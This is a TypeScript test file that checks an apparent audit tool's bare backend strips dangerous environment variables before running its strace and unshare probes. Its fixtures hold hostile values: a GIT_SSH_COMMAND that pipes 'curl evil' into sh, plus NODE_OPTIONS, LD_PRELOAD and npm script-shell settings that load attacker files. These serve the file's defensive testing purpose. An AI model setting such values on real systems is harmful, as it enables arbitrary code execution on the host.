import { afterEach, describe, expect, it } from 'vitest';
import { mkdirSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { delimiter, join } from 'node:path';

import { createBareBackend } from '../../../src/action/backend/bare.js';
import { BackendUnavailableError } from '../../../src/action/backend/types.js';
import type { BackendContext } from '../../../src/action/backend/types.js';

// The bare backend runs the audit agent + its capability probes ON THE HOST with
// the inherited runner env (unlike the clean-VM Firecracker/Docker guest), so a
// checkout-prepended PATH or an inherited loader var must NOT reach a host exec.
// These tests pin that the SAME `stripDangerousEnv` policy used by the host
// install is applied to the `strace`/`unshare` probe env (codex round-4 [critical]).

const savedWorkspace = process.env['GITHUB_WORKSPACE'];

afterEach(() => {
  if (savedWorkspace === undefined) delete process.env['GITHUB_WORKSPACE'];
  else process.env['GITHUB_WORKSPACE'] = savedWorkspace;
});

describe('createBareBackend — capability probes use the sanitized host env', () => {
  it('strips dangerous selectors and drops checkout PATH dirs from the probe env', async () => {
    // A real checkout dir so realpath-based containment resolves (mac /tmp symlink).
    const checkout = mkdtempSync(join(tmpdir(), 'sj-bare-probe-'));
    const checkoutBin = join(checkout, 'bin');
    mkdirSync(checkoutBin);
    // `checkoutRoots()` reads the REAL process env (not deps.env), so a workflow
    // checkout must be visible there for its bin dir to be recognised + dropped.
    process.env['GITHUB_WORKSPACE'] = checkout;

    let probeCmd: string | undefined;
    let probeEnv: NodeJS.ProcessEnv | undefined;

    const backend = createBareBackend({
      platform: 'linux',
      env: {
        GITHUB_WORKSPACE: checkout,
        // checkout-controlled dir prepended ahead of the system dirs
        PATH: `${checkoutBin}${delimiter}/usr/bin${delimiter}/bin`,
        // dangerous loader / config selectors that must never reach a host exec
        NODE_OPTIONS: '--require ./evil.js',
        LD_PRELOAD: './evil.so',
        GIT_SSH_COMMAND: 'sh -c "curl evil|sh"',
        NPM_CONFIG_SCRIPT_SHELL: './evil.sh',
        // legit env that MUST survive
        HOME: '/home/runner',
        HTTPS_PROXY: 'http://proxy:8080',
      },
      commandSucceeds: (cmd, _args, opts) => {
        // capture the FIRST probe (strace) then fail it so run() short-circuits
        if (probeCmd === undefined) {
          probeCmd = cmd;
          probeEnv = opts?.env;
        }
        return false;
      },
    });

    await expect(backend.run({} as BackendContext)).rejects.toBeInstanceOf(
      BackendUnavailableError,
    );

    expect(probeCmd).toBe('strace');
    expect(probeEnv).toBeDefined();
    const env = probeEnv as NodeJS.ProcessEnv;

    // dangerous selectors dropped
    expect(env['NODE_OPTIONS']).toBeUndefined();
    expect(env['LD_PRELOAD']).toBeUndefined();
    expect(env['GIT_SSH_COMMAND']).toBeUndefined();
    expect(env['NPM_CONFIG_SCRIPT_SHELL']).toBeUndefined();

    // PATH: checkout dir dropped, system dirs kept in order
    expect(env['PATH']).toBe(`/usr/bin${delimiter}/bin`);

    // legit env preserved
    expect(env['HOME']).toBe('/home/runner');
    expect(env['HTTPS_PROXY']).toBe('http://proxy:8080');

    rmSync(checkout, { recursive: true, force: true });
  });

  it('uses the same sanitized env for the unshare probe', async () => {
    const checkout = mkdtempSync(join(tmpdir(), 'sj-bare-probe2-'));
    process.env['GITHUB_WORKSPACE'] = checkout;

    const seen: Array<{ cmd: string; env: NodeJS.ProcessEnv | undefined }> = [];
    const backend = createBareBackend({
      platform: 'linux',
      env: {
        GITHUB_WORKSPACE: checkout,
        PATH: '/usr/bin',
        NODE_OPTIONS: '--require ./evil.js',
      },
      // strace passes, unshare is the one we fail + inspect
      commandSucceeds: (cmd, _args, opts) => {
        seen.push({ cmd, env: opts?.env });
        return cmd !== 'unshare';
      },
    });

    await expect(backend.run({} as BackendContext)).rejects.toBeInstanceOf(
      BackendUnavailableError,
    );

    const unshare = seen.find((s) => s.cmd === 'unshare');
    expect(unshare).toBeDefined();
    expect(unshare!.env?.['NODE_OPTIONS']).toBeUndefined();

    rmSync(checkout, { recursive: true, force: true });
  });
});
